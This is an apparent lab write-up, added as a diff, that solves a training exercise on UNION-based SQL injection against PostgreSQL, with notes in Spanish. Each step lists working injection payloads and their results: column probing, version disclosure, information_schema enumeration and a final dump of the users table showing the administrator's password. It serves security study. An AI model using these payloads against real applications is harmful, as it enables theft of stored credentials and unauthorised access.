@@ -1,0 +1,42 @@
+Lab: SQL injection attack, listing the database contents on non-Oracle databases
+
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+To solve the lab, log in as the administrator user.
+
+Análisis:
+--------
+
+1) Determinar el número de columnas:
+' order by 1--
+' order by 2--
+' order by 3-- -->Internal Server Error
+
+2 tablas
+
+2) Verificar tipo de datos:
+
+' UNION select 'a','b'-- --> 200 OK # Ambas columnas aceptan texto como tipo de dato.
+
+3) Descubrir version de la base de datos:
+
+' UNION select version(),'b'--
+PostgreSQL 12.17 (Ubuntu 12.17-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
+
+4) Listar nombres de tablas:
+    primero necesito los dos nombres de columnas --> reviso documentación de los nombre de las columnas en PostgreSQL
+    https://www.postgresql.org/docs/current/infoschema-columns.html
+
+' UNION SELECT table_name,'b' FROM information_schema.tables-- --> users_gafjqd
+
+5) Buscar columnas relevantes:
+
+' UNION SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_gafjqd'-- -->username_wgnnbd password_dorssm
+
+6) Extraer información sensible:
+
+' UNION SELECT username_wgnnbd,password_dorssm FROM users_gafjqd
+
+administrator
+1t07y6s97g9ojlw5daeb
